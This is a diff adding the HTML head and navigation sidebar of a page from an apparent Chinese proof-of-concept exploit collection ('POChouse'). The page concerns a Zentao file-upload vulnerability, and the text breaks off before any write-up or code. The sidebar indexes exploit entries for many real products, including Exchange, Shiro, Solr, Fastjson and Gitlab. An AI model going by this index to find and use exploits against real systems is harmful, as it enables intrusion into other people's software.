@@ -1,0 +1,2497 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 · POChouse</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="POChouse">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-accordion/accordion.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-emphasize/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../[+] 编辑器上传漏洞/" />
+    
+    
+    <link rel="prev" href="禅道 11.6版本 任意文件写入漏洞.html" />
+    
+
+    
+    
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    [+] 协同办公OA系统
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    Ecology-泛微OA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../Ecology-泛微OA/Bsh远程代码执行（CNVD-2019-32204）/">
+            
+                <a href="../Ecology-泛微OA/Bsh远程代码执行（CNVD-2019-32204）/">
+            
+                    
+                    Bsh远程代码执行（CNVD-2019-32204）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../Ecology-泛微OA/V9 任意文件上传/">
+            
+                <a href="../Ecology-泛微OA/V9 任意文件上传/">
+            
+                    
+                    V9 任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../Ecology-泛微OA/weaver.common.Ctrl-任意文件上传/">
+            
+                <a href="../Ecology-泛微OA/weaver.common.Ctrl-任意文件上传/">
+            
+                    
+                    weaver.common.Ctrl-任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../Ecology-泛微OA/反序列化/">
+            
+                <a href="../Ecology-泛微OA/反序列化/">
+            
+                    
+                    反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    Landray-蓝凌OA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../Landray-蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html">
+            
+                <a href="../Landray-蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html">
+            
+                    
+                    蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="../Landray-蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html">
+            
+                <a href="../Landray-蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html">
+            
+                    
+                    蓝凌OA SSRF+JNDI远程命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="../Landray-蓝凌OA/蓝凌OA 任意文件写入漏洞.html">
+            
+                <a href="../Landray-蓝凌OA/蓝凌OA 任意文件写入漏洞.html">
+            
+                    
+                    蓝凌OA 任意文件写入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" >
+            
+                <span>
+            
+                    
+                    Seeyon-致远OA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../Seeyon-致远OA/A8-FastJson反序列化RCE/">
+            
+                <a href="../Seeyon-致远OA/A8-FastJson反序列化RCE/">
+            
+                    
+                    A8-FastJson反序列化RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../Seeyon-致远OA/ajax.do任意文件上传（ CNVD-2021-01627）/">
+            
+                <a href="../Seeyon-致远OA/ajax.do任意文件上传（ CNVD-2021-01627）/">
+            
+                    
+                    ajax.do任意文件上传（ CNVD-2021-01627）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../Seeyon-致远OA/Session-任意文件上传/">
+            
+                <a href="../Seeyon-致远OA/Session-任意文件上传/">
+            
+                    
+                    Session-任意文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../Seeyon-致远OA/任意文件下载（CNVD-2020-62422）/">
+            
+                <a href="../Seeyon-致远OA/任意文件下载（CNVD-2020-62422）/">
+            
+                    
+                    任意文件下载（CNVD-2020-62422）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    Tongda-通达OA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../Tongda-通达OA/通达OA v11.2 后台任意文件上传漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.2 后台任意文件上传漏洞.html">
+            
+                    
+                    通达OA v11.2 后台任意文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../Tongda-通达OA/通达OA v11.6 任意文件删除&RCE.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.6 任意文件删除&RCE.html">
+            
+                    
+                    通达OA v11.6 任意文件删除&RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../Tongda-通达OA/通达OA v11.7 后台SQL注入.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.7 后台SQL注入.html">
+            
+                    
+                    通达OA v11.7 后台SQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../Tongda-通达OA/通达OA v11.7 在线用户登录漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.7 在线用户登录漏洞.html">
+            
+                    
+                    通达OA v11.7 在线用户登录漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../Tongda-通达OA/通达OA v11.8 后台文件包含XSS漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.8 后台文件包含XSS漏洞.html">
+            
+                    
+                    通达OA v11.8 后台文件包含XSS漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.6" data-path="../Tongda-通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html">
+            
+                    
+                    通达OA v11.8 后台文件包含命令执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.7" data-path="../Tongda-通达OA/通达OA v11.8 文件包含XSS漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.8 文件包含XSS漏洞.html">
+            
+                    
+                    通达OA v11.8 文件包含XSS漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.8" data-path="../Tongda-通达OA/通达OA v11.9 后台SQL注入漏洞.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.9 后台SQL注入漏洞.html">
+            
+                    
+                    通达OA v11.9 后台SQL注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.9" data-path="../Tongda-通达OA/通达OA v11.x-v11.5任意用户登录.html">
+            
+                <a href="../Tongda-通达OA/通达OA v11.x-v11.5任意用户登录.html">
+            
+                    
+                    通达OA v11.x-v11.5任意用户登录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.10" data-path="../Tongda-通达OA/通达OA部分漏洞信息整合.html">
+            
+                <a href="../Tongda-通达OA/通达OA部分漏洞信息整合.html">
+            
+                    
+                    通达OA部分漏洞信息整合
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    Zentao-禅道
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="zentao.html">
+            
+                <a href="zentao.html">
+            
+                    
+                    Zentao(禅道)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="禅道 11.6版本 SQL注入漏洞.html">
+            
+                <a href="禅道 11.6版本 SQL注入漏洞.html">
+            
+                    
+                    禅道 11.6版本 SQL注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="禅道 11.6版本 任意文件写入漏洞.html">
+            
+                <a href="禅道 11.6版本 任意文件写入漏洞.html">
+            
+                    
+                    禅道 11.6版本 任意文件写入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.5.4" data-path="禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html">
+            
+                <a href="禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html">
+            
+                    
+                    禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../[+] 编辑器上传漏洞/">
+            
+                <a href="../../[+] 编辑器上传漏洞/">
+            
+                    
+                    [+] 编辑器上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../[+] 网络&安全设备/">
+            
+                <a href="../../[+] 网络&安全设备/">
+            
+                    
+                    [+] 网络&安全设备
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../Apache-ActiveMQ/">
+            
+                <a href="../../Apache-ActiveMQ/">
+            
+                    
+                    Apache Active MQ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../Apache-ActiveMQ/ActiveMQ 反序列化漏洞（CVE-2015-5254）/">
+            
+                <a href="../../Apache-ActiveMQ/ActiveMQ 反序列化漏洞（CVE-2015-5254）/">
+            
+                    
+                    ActiveMQ 反序列化漏洞（CVE-2015-5254）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../Apache-ActiveMQ/ActiveMQ任意文件写入漏洞（CVE-2016-3088）/">
+            
+                <a href="../../Apache-ActiveMQ/ActiveMQ任意文件写入漏洞（CVE-2016-3088）/">
+            
+                    
+                    ActiveMQ任意文件写入漏洞（CVE-2016-3088）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../Apache-Flink/">
+            
+                <a href="../../Apache-Flink/">
+            
+                    
+                    Apache Flink
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../../Apache-Flink/Apache-Flink 1.9.1 Jar Upload RCE/">
+            
+                <a href="../../Apache-Flink/Apache-Flink 1.9.1 Jar Upload RCE/">
+            
+                    
+                    Apache-Flink 1.9.1 Jar Upload RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../../Apache-Flink/Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）/">
+            
+                <a href="../../Apache-Flink/Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）/">
+            
+                    
+                    Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../Apache-Flink/Apache-Flink-文件上传和目录遍历（CVE-2020-17518）/">
+            
+                <a href="../../Apache-Flink/Apache-Flink-文件上传和目录遍历（CVE-2020-17518）/">
+            
+                    
+                    Apache-Flink-文件上传和目录遍历（CVE-2020-17518）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../Apache-Kylin/">
+            
+                <a href="../../Apache-Kylin/">
+            
+                    
+                    Apache Kylin
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../Apache-Kylin/命令注入漏洞（CVE-2020-13925）/">
+            
+                <a href="../../Apache-Kylin/命令注入漏洞（CVE-2020-13925）/">
+            
+                    
+                    命令注入漏洞（CVE-2020-13925）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../Apache-Shiro/">
+            
+                <a href="../../Apache-Shiro/">
+            
+                    
+                    Apache Shiro
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../../Apache-Shiro/Shiro 550反序列化（CVE-2016-4437）/">
+            
+                <a href="../../Apache-Shiro/Shiro 550反序列化（CVE-2016-4437）/">
+            
+                    
+                    Shiro 550反序列化（CVE-2016-4437）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../../Apache-Shiro/Shiro 721 Padding Oracle漏洞/">
+            
+                <a href="../../Apache-Shiro/Shiro 721 Padding Oracle漏洞/">
+            
+                    
+                    Shiro 721 Padding Oracle漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../../Apache-Shiro/Shiro 权限绕过漏洞/">
+            
+                <a href="../../Apache-Shiro/Shiro 权限绕过漏洞/">
+            
+                    
+                    Shiro 权限绕过漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../../Apache-Solr/">
+            
+                <a href="../../Apache-Solr/">
+            
+                    
+                    Apache Solr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../../Apache-Solr/Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558">
+            
+                <span>
+            
+                    
+                    Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../../Apache-Solr/Solr 未授权上传漏洞（CVE-2020-13957）/">
+            
+                <a href="../../Apache-Solr/Solr 未授权上传漏洞（CVE-2020-13957）/">
+            
+                    
+                    Solr 未授权上传漏洞（CVE-2020-13957）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../../Apache-Solr/Solr 远程命令执行漏洞（CVE-2019-0193）/">
+            
+                <a href="../../Apache-Solr/Solr 远程命令执行漏洞（CVE-2019-0193）/">
+            
+                    
+                    Solr 远程命令执行漏洞（CVE-2019-0193）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../../Apache-Spark/">
+            
+                <a href="../../Apache-Spark/">
+            
+                    
+                    Apache Spark
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../../Apache-Spark/Apache Spark 未授权访问漏洞/">
+            
+                <a href="../../Apache-Spark/Apache Spark 未授权访问漏洞/">
+            
+                    
+                    Apache Spark 未授权访问漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../../Apache-Spark/RCE（CVE-2020-9480）/">
+            
+                <a href="../../Apache-Spark/RCE（CVE-2020-9480）/">
+            
+                    
+                    RCE（CVE-2020-9480）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="../../Apache-Struts2/">
+            
+                <a href="../../Apache-Struts2/">
+            
+                    
+                    Apache Struts 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="../../Apache-Tomcat/">
+            
+                <a href="../../Apache-Tomcat/">
+            
+                    
+                    Apache Tomcat
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../../Apache-Tomcat/AJP 文件包含漏洞（CVE-2020-1938）/">
+            
+                <a href="../../Apache-Tomcat/AJP 文件包含漏洞（CVE-2020-1938）/">
+            
+                    
+                    AJP 文件包含漏洞（CVE-2020-1938）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" data-path="../../Apereo-CAS/">
+            
+                <a href="../../Apereo-CAS/">
+            
+                    
+                    Apereo CAS
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../../Apereo-CAS/Apereo CAS 4.1 反序列化命令执行漏洞/">
+            
+                <a href="../../Apereo-CAS/Apereo CAS 4.1 反序列化命令执行漏洞/">
+            
+                    
+                    Apereo CAS 4.1 反序列化命令执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" data-path="../../Cacti/">
+            
+                <a href="../../Cacti/">
+            
+                    
+                    Cacti
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../../Cacti/Cacti v1.2.8 RCE（CVE-2020-8813）/">
+            
+                <a href="../../Cacti/Cacti v1.2.8 RCE（CVE-2020-8813）/">
+            
+                    
+                    Cacti v1.2.8 RCE（CVE-2020-8813）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" data-path="../../Discuz/">
+            
+                <a href="../../Discuz/">
+            
+                    
+                    Discuz
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16" data-path="../../Drupal/">
+            
+                <a href="../../Drupal/">
+            
+                    
+                    Drupal
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.16.1" data-path="../../Drupal/Drupal geddon-2 RCE（CVE-2018-7600）/">
+            
+                <a href="../../Drupal/Drupal geddon-2 RCE（CVE-2018-7600）/">
+            
+                    
+                    Drupal geddon-2 RCE（CVE-2018-7600）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.2" data-path="../../Drupal/Drupal 需要密码 内核RCE（CVE-2018-7602）/">
+            
+                <a href="../../Drupal/Drupal 需要密码 内核RCE（CVE-2018-7602）/">
+            
+                    
+                    Drupal 需要密码 内核RCE（CVE-2018-7602）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.3" data-path="../../Drupal/SA-CORE-2019-003 RCE (CVE-2019-6340">
+            
+                <span>
+            
+                    
+                    SA CORE 2019 003 RCE CVE 2019 6340
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.17" data-path="../../ECshop/">
+            
+                <a href="../../ECshop/">
+            
+                    
+                    E Cshop
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.17.1" data-path="../../ECshop/ECShop 2.7.3 RCE/">
+            
+                <a href="../../ECshop/ECShop 2.7.3 RCE/">
+            
+                    
+                    ECShop 2.7.3 RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.18" data-path="../../Exchange/">
+            
+                <a href="../../Exchange/">
+            
+                    
+                    Exchange
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.18.1" data-path="../../Exchange/RCE-普通用户（CVE-2020-17144）/">
+            
+                <a href="../../Exchange/RCE-普通用户（CVE-2020-17144）/">
+            
+                    
+                    RCE-普通用户（CVE-2020-17144）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.18.2" data-path="../../Exchange/RCE-需要域用户（CVE-2020-0688）/">
+            
+                <a href="../../Exchange/RCE-需要域用户（CVE-2020-0688）/">
+            
+                    
+                    RCE-需要域用户（CVE-2020-0688）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.18.3" data-path="../../Exchange/SSRF to RCE（CVE-2021-26855）/">
+            
+                <a href="../../Exchange/SSRF to RCE（CVE-2021-26855）/">
+            
+                    
+                    SSRF to RCE（CVE-2021-26855）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.19" data-path="../../F5-BIG-IP/">
+            
+                <a href="../../F5-BIG-IP/">
+            
+                    
+                    F 5 BIG IP
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.19.1" data-path="../../F5-BIG-IP/BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）/">
+            
+                <a href="../../F5-BIG-IP/BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）/">
+            
+                    
+                    BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.19.2" data-path="../../F5-BIG-IP/TMUI 远程代码执行漏洞（CVE-2020-5902）/">
+            
+                <a href="../../F5-BIG-IP/TMUI 远程代码执行漏洞（CVE-2020-5902）/">
+            
+                    
+                    TMUI 远程代码执行漏洞（CVE-2020-5902）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.20" data-path="../../FastAdmin/">
+            
+                <a href="../../FastAdmin/">
+            
+                    
+                    Fast Admin
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.20.1" data-path="../../FastAdmin/FastAdmin 用户权限RCE/">
+            
+                <a href="../../FastAdmin/FastAdmin 用户权限RCE/">
+            
+                    
+                    FastAdmin 用户权限RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.21" data-path="../../Fastjson/">
+            
+                <a href="../../Fastjson/">
+            
+                    
+                    Fastjson
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.21.1" data-path="../../Fastjson/Fastjson 1.2.24 反序列化RCE/">
+            
+                <a href="../../Fastjson/Fastjson 1.2.24 反序列化RCE/">
+            
+                    
+                    Fastjson 1.2.24 反序列化RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.21.2" data-path="../../Fastjson/Fastjson 1.2.47 反序列化RCE/">
+            
+                <a href="../../Fastjson/Fastjson 1.2.47 反序列化RCE/">
+            
+                    
+                    Fastjson 1.2.47 反序列化RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.21.3" data-path="../../Fastjson/Fastjson 1.2.68 反序列化RCE/">
+            
+                <a href="../../Fastjson/Fastjson 1.2.68 反序列化RCE/">
+            
+                    
+                    Fastjson 1.2.68 反序列化RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.22" data-path="../../Gitlab/">
+            
+                <a href="../../Gitlab/">
+            
+                    
+                    Gitlab
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.22.1" data-path="../../Gitlab/Gitlab 任意文件读取-鸡肋（CVE-2020-10977）/">
+            
+                <a href="../../Gitlab/Gitlab 任意文件读取-鸡肋（CVE-2020-10977）/">
+            
+                    
+                    Gitlab 任意文件读取-鸡肋（CVE-2020-10977）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.22.2" data-path="../../Gitlab/Gitlab 未授权RCE（CVE-2021-22192）/">
+            
+                <a href="../../Gitlab/Gitlab 未授权RCE（CVE-2021-22192）/">
+            
+                    
+                    Gitlab 未授权RCE（CVE-2021-22192）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.22.3" data-path="../../Gitlab/GitLab 邮箱信息泄露漏洞（CVE-2020-26413）/">
+            
+                <a href="../../Gitlab/GitLab 邮箱信息泄露漏洞（CVE-2020-26413）/">
+            
+                    
+                    GitLab 邮箱信息泄露漏洞（CVE-2020-26413）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.23" data-path="../../Harbor/">
+            
+                <a href="../../Harbor/">
+            
+                    
+                    Harbor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.24" data-path="../../JBoss/">
+            
+                <a href="../../JBoss/">
+            
+                    
+                    J Boss
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.24.1" data-path="../../JBoss/JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）/">
+            
+                <a href="../../JBoss/JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）/">
+            
+                    
+                    JBoss 5.x-6.x 反序列化漏洞（CVE-2017-12149）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.25" data-path="../../Jellyfin/">
+            
+                <a href="../../Jellyfin/">
+            
+                    
+                    Jellyfin
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.25.1" data-path="../../Jellyfin/任意文件读取漏洞（CVE-2021-21402）/">
+            
+                <a href="../../Jellyfin/任意文件读取漏洞（CVE-2021-21402）/">
+            
+                    
+                    任意文件读取漏洞（CVE-2021-21402）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.26" data-path="../../Jenkins/">
+            
+                <a href="../../Jenkins/">
+            
+                    
+                    Jenkins
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.26.1" data-path="../../Jenkins/Jenkins 远程命令执行漏洞（CVE-2018-1000861）/">
+            
+                <a href="../../Jenkins/Jenkins 远程命令执行漏洞（CVE-2018-1000861）/">
+            
+                    
+                    Jenkins 远程命令执行漏洞（CVE-2018-1000861）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.26.2" data-path="../../Jenkins/Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）/">
+            
